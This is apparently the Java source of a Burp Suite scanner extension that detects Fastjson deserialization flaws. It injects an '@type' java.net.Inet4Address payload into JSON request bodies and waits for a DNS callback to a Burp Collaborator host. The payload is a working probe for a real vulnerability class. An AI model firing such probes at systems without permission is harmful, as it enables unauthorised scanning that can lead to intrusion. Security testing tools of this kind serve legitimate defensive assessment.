package BrianW.AKA.BigChan.PowerScanner;

import BrianW.AKA.BigChan.Tools.*;
import burp.*;

import java.nio.charset.StandardCharsets;
import java.util.Date;
import java.util.List;

import static java.lang.Thread.sleep;

public class ScanFastJson  extends Reporter {
    protected IBurpExtenderCallbacks callbacks;
    protected IExtensionHelpers helpers;

    public ScanFastJson(IBurpExtenderCallbacks callbacks, IExtensionHelpers helpers) {
        super(callbacks, helpers);
        this.callbacks = callbacks;
        this.helpers = helpers;
    }

    public IScanIssue doScanFastJson(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {
        byte[] resp = baseRequestResponse.getResponse();
        byte[] req = baseRequestResponse.getRequest();
        String baseName = insertionPoint.getInsertionPointName();
        byte insertionPointType = insertionPoint.getInsertionPointType();
        String baseValue = insertionPoint.getBaseValue();
        //如果参数类型是entire body
        if (insertionPointType == 36) {
//            callbacks.printOutput("param: " + baseName + " ,type: " + insertionPointType + " ,value: " + baseValue);
            if (utils.isJson(baseValue)){
                IBurpCollaboratorClientContext collaboratorContext = this.callbacks.createBurpCollaboratorClientContext();
                String collaboratorPayload = collaboratorContext.generatePayload(true);
                callbacks.printOutput("generate Fastjson collaboratorPayload: " + collaboratorPayload);
                String sig = utils.getRandomString(3).toLowerCase();
                String payload = String.format("{ \"%s\":[[{\"@type\":\"java.net.Inet4Address\",\"val\":\"%s.%s\"}]]} ", utils.getRandomString(3), sig, collaboratorPayload);
                byte[] reqEvil = insertionPoint.buildRequest((payload).getBytes());
                IHttpRequestResponse pairEvil = callbacks.makeHttpRequest(
                        baseRequestResponse.getHttpService(),
                        reqEvil
                );
                pairEvil.setComment(payload);
                FetchCollaboratorWithSig fetch = new FetchCollaboratorWithSig(reporter(
                        "Fastjson vulnerability found",
                        String.format("param: %s <br>" +
                                        "InsertionPointType: %s <br>" +
                                        "Payload: %s"
                                ,
                                baseName,
                                insertionPointType,
                                payload
                        ),
                        "High",
                        "Certain",
                        pairEvil
                ),
                        collaboratorPayload,
                        sig,
                        callbacks,
                        helpers,
                        collaboratorContext
                );
                fetch.start();
            }
        }
        return null;
    }
}
